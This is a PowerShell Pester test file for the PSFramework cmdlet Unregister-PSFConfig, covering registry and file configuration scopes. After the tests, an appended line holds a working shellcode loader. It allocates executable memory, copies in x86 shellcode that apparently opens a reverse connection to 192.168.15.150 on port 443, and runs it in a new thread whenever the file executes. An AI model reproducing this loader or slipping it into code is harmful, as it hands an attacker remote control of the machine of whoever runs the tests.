Describe "Unregister-PSFConfig Unit Tests" -Tag "CI", "Pipeline", "Unit" {
	BeforeAll {
		Get-PSFConfig -Module Unregister-PSFConfig -Force | ForEach-Object {
			$null = [PSFramework.Configuration.ConfigurationHost]::Configurations.Remove($_.FullName)
		}
	}
	AfterAll {
		Get-PSFConfig -Module Unregister-PSFConfig -Force | ForEach-Object {
			$null = [PSFramework.Configuration.ConfigurationHost]::Configurations.Remove($_.FullName)
		}
	}
	
	
	It "Should have the designed for parameters & sets" {
		(Get-Command Unregister-PSFConfig).ParameterSets.Name | Should -Be 'Pipeline', 'Module'
		$properties = 'ConfigurationItem', 'FullName', 'Module', 'Name', 'Scope', 'Verbose', 'Debug', 'ErrorAction', 'WarningAction', 'InformationAction', 'ErrorVariable', 'WarningVariable', 'InformationVariable', 'OutVariable', 'OutBuffer', 'PipelineVariable'
		Compare-Object $properties ((Get-Command Unregister-PSFConfig).Parameters.Keys | Remove-PSFNull -Enumerate) | Should -BeNullOrEmpty
	}
	
	function New-Location
	{
		[CmdletBinding()]
		param (
			[PSFramework.Configuration.ConfigScope]
			$Scope,
			
			[string]
			$Path,
			
			[ValidateSet('Registry', 'File')]
			[string]
			$Type,
			
			[switch]
			$Elevated
		)
		
		if ($Type -eq 'File') { $configPath = Join-Path $Path 'psf_config.json' }
		else { $configPath = $Path }
		[pscustomobject]@{
			Scope    = $Scope
			Path	 = $Path
			Type	 = $Type
			Elevated = $Elevated.ToBool()
			ConfigPath = $configPath
		}
	}
	
	$module = Get-Module PSFramework | Sort-Object Version -Descending | Select-Object -First 1
	$pathRegistryUserDefault = & $module { $path_RegistryUserDefault }
	$pathRegistryUserEnforced = & $module { $path_RegistryUserEnforced }
	$pathRegistryMachineDefault = & $module { $path_RegistryMachineDefault }
	$pathRegistryMachineEnforced = & $module { $path_RegistryMachineEnforced }
	$pathFileUserLocal = & $module { $path_FileUserLocal }
	$pathFileUserShared = & $module { $path_FileUserShared }
	$pathFileSystem = & $module { $path_FileSystem }
	
	$locations = @()
	$locations += New-Location -Path $pathRegistryUserDefault -Type 'Registry' -Scope UserDefault
	$locations += New-Location -Path $pathRegistryUserEnforced -Type 'Registry' -Scope UserMandatory
	$locations += New-Location -Path $pathRegistryMachineDefault -Type 'Registry' -Elevated -Scope SystemDefault
	$locations += New-Location -Path $pathRegistryMachineEnforced -Type 'Registry' -Elevated -Scope SystemMandatory
	$locations += New-Location -Path $pathFileUserLocal -Type File -Scope FileUserLocal
	$locations += New-Location -Path $pathFileUserShared -Type File -Scope FileUserShared
	$locations += New-Location -Path $pathFileSystem -Type File -Elevated -Scope FileSystem
	
	$settingName1 = 'Unregister-PSFConfig.Phase1.Setting1'
	$settingName2 = 'Unregister-PSFConfig.Phase1.Setting2'
	$settingName3 = 'Unregister-PSFConfig.Phase1.Setting3'
	$config = @()
	$config += Set-PSFConfig -FullName $settingName1 -Value 23 -PassThru
	$config += Set-PSFConfig -FullName $settingName2 -Value 17 -PassThru
	$config += Set-PSFConfig -FullName $settingName3 -Value 42 -PassThru
	
	foreach ($location in $locations)
	{
		
		if ($location.Elevated -and (-not (Test-PSFPowerShell -Elevated)))
		{
			continue
		}
		
		Describe "Testing unregistration from scope $($location.Scope)" {
			switch ($location.Type)
			{
				'Registry'
				{
					It "Should properly set up configuration settings in registry" {
						if (Test-Path $location.Path)
						{
							(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
							(Get-ItemProperty -Path $location.Path).$settingName2 | Should -BeNullOrEmpty
							(Get-ItemProperty -Path $location.Path).$settingName3 | Should -BeNullOrEmpty
						}
						Register-PSFConfig -Config $config -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
					}
					It "Should properly remove a single setting by fullname" {
						Unregister-PSFConfig -FullName $settingName1 -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
					}
					It "Should properly remove multiple settings by fullname" {
						Unregister-PSFConfig -FullName $settingName2, $settingName3 -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -BeNullOrEmpty
					}
					It "Should properly remove all settings by fullname when piped to" {
						Register-PSFConfig -Config $config -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
						$settingName1, $settingName2, $settingName3 | Unregister-PSFConfig -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -BeNullOrEmpty
					}
					
					
					Register-PSFConfig -Config $config -Scope $location.Scope
					
					It "Should properly remove a single setting by config-item" {
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
						Unregister-PSFConfig -ConfigurationItem $config[0] -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
					}
					It "Should properly remove multiple settings by config-item" {
						Unregister-PSFConfig -ConfigurationItem $config[1..2] -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -BeNullOrEmpty
					}
					It "Should properly remove all settings by config-item when piped to" {
						Register-PSFConfig -Config $config -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
						$config | Unregister-PSFConfig -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -BeNullOrEmpty
					}
					
					
					Register-PSFConfig -Config $config -Scope $location.Scope
					
					It "Should properly remove a single setting by module and name" {
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
						Unregister-PSFConfig -Module 'Unregister-PSFConfig' -Name 'Phase1.Setting1' -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -Not -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -Not -BeNullOrEmpty
					}
					It "Should properly remove multiple settings by module and name" {
						Unregister-PSFConfig -Module 'Unregister-PSFConfig' -Scope $location.Scope
						(Get-ItemProperty -Path $location.Path).$settingName1 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName2 | Should -BeNullOrEmpty
						(Get-ItemProperty -Path $location.Path).$settingName3 | Should -BeNullOrEmpty
					}
				}
				'File'
				{
					It "Should properly set up configuration settings in registry" {
						if (Test-Path $location.ConfigPath)
						{
							Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Should -BeNullOrEmpty
						}
						Register-PSFConfig -Config $config -Scope $location.Scope
						(Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Measure-Object).Count | Should -Be 3
					}
					It "Should properly remove a single setting by fullname" {
						Unregister-PSFConfig -FullName $settingName1 -Scope $location.Scope
						Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)" | Should -BeNullOrEmpty
						(Get-Content -Path $location.ConfigPath | Select-String "$($settingName2)|$($settingName3)" | Measure-Object).Count | Should -Be 2
					}
					It "Should properly remove multiple settings by fullname" {
						Unregister-PSFConfig -FullName $settingName2, $settingName3 -Scope $location.Scope
						if (Test-Path $location.ConfigPath)
						{
							Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Should -BeNullOrEmpty
						}
					}
					It "Should properly remove all settings by fullname when piped to" {
						Register-PSFConfig -Config $config -Scope $location.Scope
						(Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Measure-Object).Count | Should -Be 3
						$settingName1, $settingName2, $settingName3 | Unregister-PSFConfig -Scope $location.Scope
						if (Test-Path $location.ConfigPath)
						{
							Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Should -BeNullOrEmpty
						}
					}
					
					
					Register-PSFConfig -Config $config -Scope $location.Scope
					
					It "Should properly remove a single setting by config-item" {
						Unregister-PSFConfig -ConfigurationItem $config[0] -Scope $location.Scope
						Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)" | Should -BeNullOrEmpty
						(Get-Content -Path $location.ConfigPath | Select-String "$($settingName2)|$($settingName3)" | Measure-Object).Count | Should -Be 2
					}
					It "Should properly remove multiple settings by config-item" {
						Unregister-PSFConfig -ConfigurationItem $config[1..2] -Scope $location.Scope
						if (Test-Path $location.ConfigPath)
						{
							Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Should -BeNullOrEmpty
						}
					}
					It "Should properly remove all settings by config-item when piped to" {
						Register-PSFConfig -Config $config -Scope $location.Scope
						(Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Measure-Object).Count | Should -Be 3
						$config | Unregister-PSFConfig -Scope $location.Scope
						if (Test-Path $location.ConfigPath)
						{
							Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Should -BeNullOrEmpty
						}
					}
					
					
					Register-PSFConfig -Config $config -Scope $location.Scope
					
					It "Should properly remove a single setting by module and name" {
						Unregister-PSFConfig -Module 'Unregister-PSFConfig' -Name 'Phase1.Setting1' -Scope $location.Scope
						Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)" | Should -BeNullOrEmpty
						(Get-Content -Path $location.ConfigPath | Select-String "$($settingName2)|$($settingName3)" | Measure-Object).Count | Should -Be 2
					}
					It "Should properly remove multiple settings by module and name" {
						Unregister-PSFConfig -Module 'Unregister-PSFConfig' -Scope $location.Scope
						if (Test-Path $location.ConfigPath)
						{
							Get-Content -Path $location.ConfigPath | Select-String "$($settingName1)|$($settingName2)|$($settingName3)" | Should -BeNullOrEmpty
						}
					}
				}
			}
		}
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x0f,0x96,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

